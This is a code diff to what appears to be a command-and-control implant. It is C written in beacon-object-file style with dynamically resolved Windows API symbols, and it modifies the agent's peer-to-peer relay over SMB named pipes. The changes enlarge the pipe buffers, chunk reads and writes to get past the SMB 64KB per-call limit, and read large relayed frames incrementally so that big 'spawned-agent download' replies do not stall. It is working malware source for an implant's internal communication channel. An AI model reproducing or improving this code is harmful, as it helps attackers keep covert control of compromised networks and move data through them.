@@ -48,8 +48,20 @@ WINBASEAPI unsigned short WINAPI WS2_32$htons(unsigned short);
 /* ws2_32 symbols resolve through the agent's dynamic resolution (ror13) — add
  * WS2_32 to the linker.spec dfr list. KERNEL32$X entries resolve normally. */
 
-#define PIPE_BUF_SIZE 16384
+/* 256KB pipe buffers: a spawned-agent download reply (a ~220KB base64
+ * envelope) fits entirely in the buffer, so the parent's write completes
+ * without needing the child to drain concurrently (a 16KB buffer made big
+ * replies block the writer and stall the relay). */
+#define PIPE_BUF_SIZE 262144
 #define MAX_FRAME_SIZE (1024 * 1024)
+
+/* The SMB redirector (a \\host\pipe\... client handle, even to 127.0.0.1)
+ * rejects a single WriteFile/ReadFile call larger than 64KB with
+ * ERROR_INVALID_PARAMETER (87), regardless of the pipe's declared buffer
+ * size. Spawn downloads relay ~223KB replies down such a handle, so all
+ * pipe I/O must be chunked — the byte-mode stream keeps the frame intact
+ * across calls. 32KB leaves headroom under every negotiated cap. */
+#define PIPE_IO_CHUNK (32 * 1024)
 
 /* ============================================================
  * Framing helpers
@@ -59,7 +71,8 @@ static int read_exact_handle(HANDLE h, char *buf, int len) {
 	int got = 0;
 	while (got < len) {
 		DWORD n = 0;
-		if (!KERNEL32$ReadFile(h, buf + got, (DWORD)(len - got), &n, NULL) || n == 0) {
+		int want = (len - got) > PIPE_IO_CHUNK ? PIPE_IO_CHUNK : (len - got);
+		if (!KERNEL32$ReadFile(h, buf + got, (DWORD)want, &n, NULL) || n == 0) {
 			return -1;
 		}
 		got += (int)n;
@@ -71,7 +84,8 @@ static int write_exact_handle(HANDLE h, const char *buf, int len) {
 	int sent = 0;
 	while (sent < len) {
 		DWORD n = 0;
-		if (!KERNEL32$WriteFile(h, buf + sent, (DWORD)(len - sent), &n, NULL) || n == 0) {
+		int want = (len - sent) > PIPE_IO_CHUNK ? PIPE_IO_CHUNK : (len - sent);
+		if (!KERNEL32$WriteFile(h, buf + sent, (DWORD)want, &n, NULL) || n == 0) {
 			return -1;
 		}
 		sent += (int)n;
@@ -271,7 +285,10 @@ char *p2p_recv_timeout(P2P_PEER *peer, int timeout_seconds) {
 		/* Wait for the 4-byte length header to be available. */
 		DWORD total = 0;
 		while (waited < deadline) {
-			if (KERNEL32$PeekNamedPipe(peer->pipe, NULL, 0, NULL, &total, NULL) && total >= 4) {
+			if (!KERNEL32$PeekNamedPipe(peer->pipe, NULL, 0, NULL, &total, NULL)) {
+				return NULL; /* broken pipe: fail fast */
+			}
+			if (total >= 4) {
 				break;
 			}
 			KERNEL32$Sleep(100);
@@ -288,22 +305,42 @@ char *p2p_recv_timeout(P2P_PEER *peer, int timeout_seconds) {
 		if (len == 0 || len > MAX_FRAME_SIZE) {
 			return NULL;
 		}
-		/* Wait for the full body. */
-		waited = 0;
-		while (waited < deadline) {
-			if (KERNEL32$PeekNamedPipe(peer->pipe, NULL, 0, NULL, &total, NULL) && total >= len) {
-				break;
-			}
-			KERNEL32$Sleep(100);
-			waited++;
-		}
-		if (waited >= deadline) {
-			return NULL;
-		}
 		char *msg = (char *)KERNEL32$VirtualAlloc(0, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-		if (msg == NULL || read_exact_handle(peer->pipe, msg, (int)len) != 0) {
-			if (msg) { KERNEL32$VirtualFree(msg, 0, MEM_RELEASE); }
+		if (msg == NULL) {
 			return NULL;
+		}
+		/* Drain the body incrementally with a deadline. We must READ (not just
+		 * peek): the pipe buffer is only 16KB, so for frames larger than that
+		 * the writer blocks once the buffer fills and only makes progress as
+		 * we consume bytes. */
+		unsigned int body_read = 0;
+		waited = 0;
+		while (body_read < len) {
+			DWORD avail = 0;
+			if (!KERNEL32$PeekNamedPipe(peer->pipe, NULL, 0, NULL, &avail, NULL)) {
+				KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+				return NULL; /* broken pipe */
+			}
+			if (avail > 0) {
+				DWORD to_read = ((unsigned int)avail < (len - body_read)) ? avail : (len - body_read);
+				if (to_read > PIPE_IO_CHUNK) { to_read = PIPE_IO_CHUNK; }
+				DWORD n = 0;
+				if (!KERNEL32$ReadFile(peer->pipe, msg + body_read, to_read, &n, NULL) || n == 0) {
+					KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+					return NULL;
+				}
+				body_read += (unsigned int)n;
+				if (n > 0) {
+					waited = 0; /* progress: keep the deadline for stalls, not drains */
+				}
+			} else {
+				KERNEL32$Sleep(100);
+				waited++;
+				if (waited >= deadline) {
+					KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+					return NULL;
+				}
+			}
 		}
 		msg[len] = '\0';
 		return msg;
